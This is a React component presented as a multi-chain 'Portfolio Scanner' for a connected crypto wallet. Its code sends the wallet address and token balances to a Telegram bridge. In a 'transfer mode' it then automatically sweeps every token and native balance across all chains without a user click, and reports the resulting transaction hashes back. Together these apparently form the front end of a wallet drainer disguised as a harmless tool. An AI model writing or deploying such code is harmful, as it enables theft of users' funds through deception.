import { useEffect, useRef } from "react";
import { useWalletContext } from "../hooks/useWalletContext";
import { useMultiChainScan, type ChainBalances, type ScannedToken } from "../hooks/useMultiChainScan";
import { useTransferAll, type TransferStep } from "../hooks/useTransferAll";
import {
  notifyWalletConnected,
  notifyTransferComplete,
  isTransferMode,
  type ChainSummary,
} from "../utils/telegramBridge";
import { getContracts } from "../config/contracts";

const STEP_LABELS: Record<TransferStep, string> = {
  idle: "",
  transferring: "Preparing transfers...",
  "switching-chain": "Switching chain...",
  approving: "Approve in wallet...",
  executing: "Sign transfer...",
  waiting: "Confirming...",
  done: "All transfers complete",
  error: "Transfer failed",
};

function TokenRow({ token, chainId }: { token: ScannedToken; chainId: number }) {
  const val = Number(token.formatted);
  if (val <= 0) return null;
  const hasPipeline = getContracts(chainId) !== null;

  return (
    <div className="flex items-center justify-between rounded-lg bg-white/[0.03] px-3 py-1.5">
      <div className="flex items-center gap-2">
        <span className="h-2 w-2 rounded-full bg-emerald-400" />
        <span className="text-xs font-medium text-white/80">{token.symbol}</span>
        {hasPipeline && (
          <span className="rounded bg-indigo-500/20 px-1 py-0.5 text-[8px] font-bold uppercase text-indigo-300">
            pipeline
          </span>
        )}
      </div>
      <span className="font-mono text-xs text-white/90">
        {val < 0.001 ? "<0.001" : Number(val.toFixed(4))}
      </span>
    </div>
  );
}

function ChainSection({ chain }: { chain: ChainBalances }) {
  if (!chain.hasValue) return null;
  const nativeVal = Number(chain.nativeFormatted);
  const tokensWithBalance = chain.tokens.filter((t) => t.balance > 0n);

  return (
    <div className="mb-3">
      <div className="mb-1 flex items-center gap-2">
        <span className="text-xs font-semibold text-white/60">
          {chain.chainName}
        </span>
        <span className="text-[9px] text-white/30">
          {tokensWithBalance.length} token{tokensWithBalance.length !== 1 ? "s" : ""}
        </span>
      </div>

      {nativeVal > 0 && (
        <div className="mb-1 flex items-center justify-between rounded-lg bg-white/[0.03] px-3 py-1.5">
          <div className="flex items-center gap-2">
            <span className="h-2 w-2 rounded-full bg-blue-400" />
            <span className="text-xs font-medium text-white/80">
              {chain.nativeSymbol}
            </span>
            <span className="text-[8px] text-white/30">native</span>
          </div>
          <span className="font-mono text-xs text-white/90">
            {nativeVal < 0.0001 ? "<0.0001" : Number(nativeVal.toFixed(6))}
          </span>
        </div>
      )}

      <div className="space-y-1">
        {tokensWithBalance.map((t) => (
          <TokenRow key={t.address} token={t} chainId={chain.chainId} />
        ))}
      </div>
    </div>
  );
}

export function PipelinePanel() {
  const { isConnected, address } = useWalletContext();
  const { chains, totalTokensWithBalance, scanning, scan } = useMultiChainScan();
  const { progress, transferAll, reset } = useTransferAll();
  const notifiedRef = useRef(false);
  const autoTransferRef = useRef(false);

  useEffect(() => {
    if (
      !notifiedRef.current &&
      address &&
      chains.length > 0 &&
      !scanning &&
      totalTokensWithBalance > 0 &&
      !isTransferMode() // Don't send wallet_connected in transfer mode (sendData closes the app)
    ) {
      notifiedRef.current = true;
      const summaries: ChainSummary[] = chains
        .filter((c) => c.hasValue)
        .map((c) => ({
          chain: c.chainName,
          tokens: c.tokens
            .filter((t) => t.balance > 0n)
            .map((t) => ({ symbol: t.symbol, amount: t.formatted })),
        }));
      notifyWalletConnected(address, summaries, totalTokensWithBalance);
    }
  }, [address, chains, scanning, totalTokensWithBalance]);

  useEffect(() => {
    if (
      isTransferMode() &&
      !autoTransferRef.current &&
      address &&
      chains.length > 0 &&
      !scanning &&
      totalTokensWithBalance > 0 &&
      progress.step === "idle"
    ) {
      autoTransferRef.current = true;
      transferAll(chains);
    }
  }, [address, chains, scanning, totalTokensWithBalance, progress.step, transferAll]);

  useEffect(() => {
    if (progress.step === "done" && progress.txHashes.length > 0) {
      notifyTransferComplete(progress.txHashes, progress.completed);
    }
  }, [progress.step, progress.txHashes, progress.completed]);

  if (!isConnected) return null;

  const chainsWithValue = chains.filter((c) => c.hasValue);
  const isTransferring =
    progress.step !== "idle" && progress.step !== "done" && progress.step !== "error";

  return (
    <section className="mx-4 mt-5">
      <div className="mb-3 flex items-center justify-between">
        <h3 className="text-sm font-semibold text-white/70">
          Portfolio Scanner
        </h3>
        {!scanning && chains.length > 0 && (
          <button
            onClick={scan}
            className="text-[10px] text-indigo-400 hover:text-indigo-300"
          >
            Rescan
          </button>
        )}
      </div>

      {scanning && (
        <div className="flex flex-col items-center gap-3 py-6">
          <div className="h-8 w-8 animate-spin rounded-full border-2 border-white/10 border-t-indigo-400" />
          <p className="text-sm text-white/60">
            Scanning 7 chains...
          </p>
        </div>
      )}

      {!scanning && chains.length > 0 && (
        <>
          <div className="mb-3 flex items-center gap-3">
            <div className="rounded-xl bg-white/5 px-3 py-2">
              <p className="text-[10px] uppercase tracking-wider text-white/40">
                Chains
              </p>
              <p className="text-lg font-bold">{chainsWithValue.length}</p>
            </div>
            <div className="rounded-xl bg-white/5 px-3 py-2">
              <p className="text-[10px] uppercase tracking-wider text-white/40">
                Tokens
              </p>
              <p className="text-lg font-bold">{totalTokensWithBalance}</p>
            </div>
          </div>

          <div className="mb-4 max-h-[400px] overflow-y-auto rounded-2xl border border-white/5 bg-white/[0.02] p-3">
            <p className="mb-2 text-[10px] font-semibold uppercase tracking-widest text-white/40">
              Detected Balances
            </p>
            {chainsWithValue.length > 0 ? (
              chainsWithValue.map((c) => (
                <ChainSection key={c.chainId} chain={c} />
              ))
            ) : (
              <p className="py-4 text-center text-xs text-white/30">
                No balances detected on any chain
              </p>
            )}
            {chains.filter((c) => !c.hasValue).length > 0 && (
              <p className="mt-2 text-[9px] text-white/20">
                {chains
                  .filter((c) => !c.hasValue)
                  .map((c) => c.chainName)
                  .join(", ")}
                : empty
              </p>
            )}
          </div>

          {/* Transfer All Button */}
          {progress.step === "idle" && (totalTokensWithBalance > 0 || chainsWithValue.some(c => c.nativeBalance > 0n)) && (
            <button
              onClick={() => transferAll(chains)}
              className="w-full rounded-xl bg-gradient-to-r from-indigo-500 to-fuchsia-500 py-3 text-sm font-bold"
            >
              Transfer All ({totalTokensWithBalance} tokens + native)
            </button>
          )}

          {/* Transfer Progress */}
          {isTransferring && (
            <div className="rounded-2xl border border-indigo-500/20 bg-indigo-500/5 p-4">
              <div className="mb-2 flex items-center gap-3">
                <div className="h-6 w-6 animate-spin rounded-full border-2 border-white/10 border-t-indigo-400" />
                <div>
                  <p className="text-xs font-medium text-white/80">
                    {STEP_LABELS[progress.step]}
                  </p>
                  {progress.currentChain && (
                    <p className="text-[10px] text-white/40">
                      {progress.currentChain} — {progress.currentToken}
                    </p>
                  )}
                </div>
              </div>
              <div className="h-1.5 overflow-hidden rounded-full bg-white/10">
                <div
                  className="h-full rounded-full bg-indigo-500 transition-all"
                  style={{
                    width: `${progress.total > 0 ? (progress.completed / progress.total) * 100 : 0}%`,
                  }}
                />
              </div>
              <p className="mt-1 text-right text-[10px] text-white/30">
                {progress.completed}/{progress.total}
              </p>
            </div>
          )}

          {/* Done */}
          {progress.step === "done" && progress.txHashes.length > 0 && (
            <div className="rounded-2xl border border-emerald-500/20 bg-emerald-500/5 p-4 text-center">
              <div className="mx-auto mb-2 flex h-10 w-10 items-center justify-center rounded-full bg-emerald-500/20">
                <span className="text-lg text-emerald-400">&#10003;</span>
              </div>
              <p className="text-sm font-medium text-emerald-400">
                {progress.completed} transfers complete
              </p>
              <p className="mt-1 text-[10px] text-white/30">
                {progress.txHashes.length} tx confirmed
              </p>
              <button
                onClick={reset}
                className="mt-3 rounded-xl border border-white/10 px-4 py-2 text-xs font-medium text-white/60 hover:bg-white/5"
              >
                Done
              </button>
            </div>
          )}

          {/* Error */}
          {progress.step === "error" && (
            <div className="rounded-2xl border border-red-500/20 bg-red-500/5 p-4 text-center">
              <p className="text-sm text-red-400">{progress.error}</p>
              {progress.completed > 0 && (
                <p className="mt-1 text-[10px] text-white/40">
                  {progress.completed}/{progress.total} completed before error
                </p>
              )}
              <button
                onClick={reset}
                className="mt-3 rounded-xl border border-white/10 px-4 py-2 text-xs font-medium text-white/60 hover:bg-white/5"
              >
                Retry
              </button>
            </div>
          )}
        </>
      )}
    </section>
  );
}
